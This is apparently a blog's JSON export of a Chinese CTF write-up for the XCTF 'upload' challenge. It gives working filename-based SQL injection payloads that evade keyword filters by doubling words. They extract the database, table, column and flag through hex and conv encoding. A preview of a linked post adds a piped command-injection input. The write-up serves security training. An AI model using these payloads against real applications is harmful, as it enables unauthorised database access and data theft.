{"title":"攻防世界：upload","uid":"006aa54f10dc84a237bfb17ee3048459","slug":"攻防世界：upload","date":"2022-05-11T08:43:06.000Z","updated":"2022-05-11T10:54:14.236Z","comments":true,"path":"api/articles/攻防世界：upload.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>攻防世界一道Web进阶题，题目是upload，最后做了半天使用upload的方式一点用没有，看了几篇博主的帖子，发现是SQL注入，文件名的SQL注入。</p>\n<p><img src=\"/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload.htm/image-20220511164730539.png\" alt=\"image-20220511164730539\"></p>\n<p><img src=\"/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload.htm/image-20220511164739748.png\" alt=\"image-20220511164739748\"></p>\n<p><img src=\"/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload.htm/image-20220511164837732.png\" alt=\"image-20220511164837732\"></p>\n<h2 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h2><p>上传2.jpg文件会返回文件名，上传php文件返回：不正确的拓展名；开始以为有检测，尝试了各种upload的绕过方式，都不行，都会返回不正确的拓展名。</p>\n<p><img src=\"/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload.htm/image-20220511165213924.png\" alt=\"image-20220511165213924\"></p>\n<p><img src=\"/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload.htm/image-20220511165320646.png\" alt=\"image-20220511165320646\"></p>\n<h2 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h2><p>看了几篇帖子才知道是基于文件名的SQL注入：</p>\n<p>因为回显的只是文件名，然后它存入数据库的也可能是文件名，既然连接了数据库就可能存在注入漏洞。然后就能想到可能是文件名sql注入。</p>\n<p><strong>任何与数据库发生连接交互的地方都可能存在SQL注入！</strong></p>\n<h2 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h2><p>涉及几个函数：</p>\n<p><code>conv(N,from_base,to_base)</code> ：conv函数接收一个数字，进行进制转换<br>N是指函数接受的数值，from_base是指这个数值原来的进制，to_base是指需要转化的进制。</p>\n<p><code>Substr()</code><br>第一种：<br><code>SBUSTR(str,pos);</code><br>就是从pos开始的位置，一直截取到最后。<br>第二种：<br><code>SUBSTR(str,pos,len);</code><br>len指截取长度<br>这种表示的意思是，就是从pos开始的位置，截取len个字符(空白也算字符)。<br>需要注意的是：如果pos为1(而不是0)，表示从第一个位置开始</p>\n<p><code>Hex()</code>：<br>这个函数就是把里面的参数转化成16进制。</p>\n<h2 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h2><p>插入SQl语句：</p>\n<p><img src=\"/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload.htm/image-20220511170451146.png\" alt=\"image-20220511170451146\"></p>\n<p>可以看到<code>select</code>被过滤了，尝试绕过：</p>\n<p>这里使用双写绕过成功</p>\n<p><img src=\"/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload.htm/image-20220511170657950.png\" alt=\"image-20220511170657950\"></p>\n<p>在后续测试过程中from也被过滤，最后也是用双写绕过。</p>\n<p>在这里其实就可以知道存在sql注入了；</p>\n<h2 id=\"0x05\"><a href=\"#0x05\" class=\"headerlink\" title=\"0x05\"></a>0x05</h2><p>尝试去验证sql注入：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1&#39;+(selselectect database())+&#39;.jpg<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>可以看到sql语句被执行了，但是只输出一个1，后续查询的结果没有被输出。(可能数据被过滤掉了)</p>\n<p><img src=\"/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload.htm/image-20220511171849122.png\" alt=\"image-20220511171849122\"></p>\n<p><img src=\"/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload.htm/image-20220511171808488.png\" alt=\"image-20220511171808488\"></p>\n<h2 id=\"0x06\"><a href=\"#0x06\" class=\"headerlink\" title=\"0x06\"></a>0x06</h2><p>尝试将查询结果改为16进制输出</p>\n<p>构造payload ：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1&#39;+(selselectect hex(database()))+&#39;.jpg<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload.htm/image-20220511173040394.png\" alt=\"image-20220511173040394\"></p>\n<p>将数据库名字转换16进制+1输出得到7765626（7765625+1），将这个数字16进制解码得到web</p>\n<p><img src=\"/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload.htm/image-20220511173441841.png\" alt=\"image-20220511173441841\"></p>\n<p>这里有个坑,  插入数据库文件名中如果包括SQL语句，在返回信息时，服务器将对字母进行截断（某些特殊字符也会截断或过滤） 尝试用10进制表示 conv函数(src,from_base,to_base) src是要转换的数据, from_base是原进制, to_base是目标进制.</p>\n<p><strong>使用CONV是因为题目过滤了回显有字母的情况，如果出现了字母则后面的内容就不显示，所以需要将16进制的内容转成10进制。</strong></p>\n<p>构造payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#39;+(selselectect conv(hex(database()),16,10))+&#39;.jpg<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload.htm/image-20220511174116852.png\" alt=\"image-20220511174116852\"></p>\n<p>返回结果使用了科学计数法，这里就需要截断数据了。</p>\n<p> 构造payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#39;+(selselectect conv(substr(hex(database()),1,12),16,10))+ &#39;.jpg <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>(经过测试发现长度最大为12,超过12 就会返回科学计数法表示)</p>\n<p><img src=\"/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload.htm/image-20220511174408587.png\" alt=\"image-20220511174408587\"></p>\n<p>有返回值：<code>131277325825392</code></p>\n<p>尝试截取13试试：<br><img src=\"/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload.htm/image-20220511174500681.png\" alt=\"image-20220511174500681\"></p>\n<p>可以看到返回的还是科学计数法，验证最大为12。</p>\n<p>将十进制<code>131277325825392</code>转换为16进制<code>7765625f7570</code>，16进制解码得到部分数据库名：</p>\n<p><img src=\"/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload.htm/image-20220511175058980.png\" alt=\"image-20220511175058980\"></p>\n<p><img src=\"/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload.htm/image-20220511175215303.png\" alt=\"image-20220511175215303\"></p>\n<p>由此可以得出7765626并不是完整的16进制编码的数据库名，在返回信息时，服务器应该是对其进行了截断。</p>\n<p>由于上述返回的是科学计数法，对其进行了截断处理，所以再将后面的结果将其查出：</p>\n<p>构造payload：（从13开始）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#39;+(selselectect conv(substr(hex(database()),13,12),16,10))+&#39;.jpg<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload.htm/image-20220511175910444.png\" alt=\"image-20220511175910444\"></p>\n<p>得到<code>1819238756</code>，解码得到：<code>---&gt;6c6f6164---&gt;load</code></p>\n<p>最后将其拼接得到完整的数据名：<code>web_upload</code></p>\n<h2 id=\"0x07\"><a href=\"#0x07\" class=\"headerlink\" title=\"0x07\"></a>0x07</h2><p><strong>查表：</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#39;+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema&#x3D;&#39;web_upload&#39; limit 1,1)),1,12),16,10))+&#39;.jpg<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload.htm/image-20220511180721439.png\" alt=\"image-20220511180721439\"></p>\n<p>返回：<code>114784820031327</code>—&gt;<code>68656c6c6f5f（16）</code>—&gt;<code>hello_</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#39;+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema&#x3D;&#39;web_upload&#39; limit 1,1)),13,12),16,10))+&#39;.jpg<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>返回：<code>112615676665705</code>—&gt;<code>666c61675f69（16）</code>—&gt;<code>flag_i</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#39;+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema&#x3D;&#39;web_upload&#39; limit 1,1)),25,12),16,10))+&#39;.jpg<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>返回：<code>126853610566245</code>—&gt;<code>735f68657265（16）</code>—&gt;<code>s_here</code></p>\n<p>表名拼接为：<code>hello_flag_is_here</code></p>\n<p>##0x08</p>\n<p><strong>查字段：</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#39;+(seleselectct+conv(substr(hex((selselectect column_name frfromom information_schema.columns where table_name&#x3D;&#39;hello_flag_is_here&#39; limit 0,1)),1,12),16,10))+&#39;.jpg<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload.htm/image-20220511182706415.png\" alt=\"image-20220511182706415\"></p>\n<p><img src=\"/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload.htm/image-20220511182715960.png\" alt=\"image-20220511182715960\"></p>\n<p>返回：<code>115858377367398</code>—&gt;<code>695f616d5f66（16）</code>—&gt;<code>i_am_f</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#39;+(seleselectct+conv(substr(hex((selselectect column_name frfromom information_schema.columns where table_name&#x3D;&#39;hello_flag_is_here&#39; limit 0,1)),13,12),16,10))+&#39;.jpg<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>返回：<code>7102823</code>—&gt;<code>6c6167（16）</code>—&gt;<code>lag</code></p>\n<p>字段拼接为：<code>i_am_flag</code></p>\n<p>##0x09</p>\n<p><strong>查内容：</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#39;+(seleselectct+conv(substr(hex(selselectect i_am_flag frfromom hello_flag_is_here limit 0,1),1,12),16,10))+&#39;.jpg<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload.htm/image-20220511183508159.png\" alt=\"image-20220511183508159\"></p>\n<p><img src=\"/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload.htm/image-20220511183522209.png\" alt=\"image-20220511183522209\"></p>\n<p>返回：<code>36427215695199</code>—&gt;<code>21215f406d5f（16）</code>—&gt;<code>!!_@m_</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#39;+(seleselectct+conv(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+&#39;.jpg<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>返回：<code>92806431727430</code>—&gt;<code>54682e655f46（16）</code>—&gt;<code>Th.e_F</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#39;+(seleselectct+conv(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+&#39;.jpg<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>返回：<code>560750951</code>—&gt;<code>216c6167（16）</code>—&gt;<code>!lag</code></p>\n<p>拼接flag为：<code>!!_@m_Th.e_F!lag</code></p>\n<p>参考文章：</p>\n<p><a href=\"https://blog.csdn.net/qq_44065556/article/details/120449847\">https://blog.csdn.net/qq_44065556/article/details/120449847</a></p>\n<p><a href=\"https://blog.csdn.net/mochu7777777/article/details/104724247\">https://blog.csdn.net/mochu7777777/article/details/104724247</a></p>\n<h2 id=\"0x10（总结）\"><a href=\"#0x10（总结）\" class=\"headerlink\" title=\"0x10（总结）\"></a>0x10（总结）</h2><p>这个题拿到以后首先肯定认为是文件上传的题目，但由于上传文件不会返回文件路径，这是和一般上传题目不同的地方；其次，每次上传之后返回的是文件名，这不由的会想到sql注入的特征：报错回显，正确返回内容。这里最主要就是要想到：<strong>因为回显的只是文件名，然后它存入数据库的也可能是文件名，既然连接了数据库就可能存在注入漏洞。然后就能想到可能是文件名sql注入。任何与数据库发生连接交互的地方都可能存在SQL注入！有文件名回显,这说明文件已经被传到了数据库中,浏览器又从数据库中读取了上传的文件,那么这个过程就有可能触发sql注入。</strong></p>\n<p>题中还有一个是：使用<code>conv函数</code>是因为题目过滤了回显有字母的情况，如果出现了字母则后面的内容就不显示，所以需要将16进制的内容转成10进制。</p>\n","text":"前言攻防世界一道Web进阶题，题目是upload，最后做了半天使用upload的方式一点用没有，看了几篇博主的帖子，发现是SQL注入，文件名的SQL注入。 0x01上传2.jpg文件会返回文件名，上传php文件返回：不正确的拓展名；开始以为有检测，尝试了各种upload的绕过方式...","link":"","photos":[],"count_time":{"symbolsCount":"3.9k","symbolsTime":"4 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"},{"name":"文件上传","slug":"文件上传","count":7,"path":"api/tags/文件上传.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01\"><span class=\"toc-text\">0x01</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03\"><span class=\"toc-text\">0x03</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04\"><span class=\"toc-text\">0x04</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x05\"><span class=\"toc-text\">0x05</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x06\"><span class=\"toc-text\">0x06</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x07\"><span class=\"toc-text\">0x07</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x10%EF%BC%88%E6%80%BB%E7%BB%93%EF%BC%89\"><span class=\"toc-text\">0x10（总结）</span></a></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"逻辑越权--水平垂直越权","uid":"e12149c3e216e6cbcac496259253a06d","slug":"逻辑越权-水平垂直越权","date":"2022-05-30T08:55:04.000Z","updated":"2022-05-30T10:40:06.234Z","comments":true,"path":"api/articles/逻辑越权-水平垂直越权.json","keywords":null,"cover":[],"text":"0x00脑图： 0x01 漏洞产生原因通常情况下，一个 Web 程序功能流程是登录 - 提交请求 - 验证权限 - 数据库查询 - 返回结果。如果验证权限不足，便会导致越权。常见的程序都会认为通过登录后即可验证用户的身份，从而不会做下一步验证，最后导致越权。 隐藏URL 直接对象...","link":"","photos":[],"count_time":{"symbolsCount":847,"symbolsTime":"1 mins."},"categories":[{"name":"逻辑越权","slug":"逻辑越权","count":6,"path":"api/categories/逻辑越权.json"}],"tags":[{"name":"逻辑越权","slug":"逻辑越权","count":6,"path":"api/tags/逻辑越权.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"攻防世界-web-command_execution","uid":"c8ef155fa65ec1b0a64a3057d6715027","slug":"攻防世界-web-command-execution","date":"2022-05-09T08:49:25.000Z","updated":"2022-05-09T09:05:38.529Z","comments":true,"path":"api/articles/攻防世界-web-command-execution.json","keywords":null,"cover":[],"text":"前言一道攻防世界的命令执行题目。 0x00 根据提示RCE无WAF，直接打开题目。 0x01 ##0x02 老规矩，先看看是何服务器 linux服务器。 0x03先ping 127.0.0.1，有结果 使用linux管道符查看目录 127.0.0.1|ls 当前目录为index....","link":"","photos":[],"count_time":{"symbolsCount":496,"symbolsTime":"1 mins."},"categories":[{"name":"RCE","slug":"RCE","count":3,"path":"api/categories/RCE.json"}],"tags":[{"name":"RCE","slug":"RCE","count":4,"path":"api/tags/RCE.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}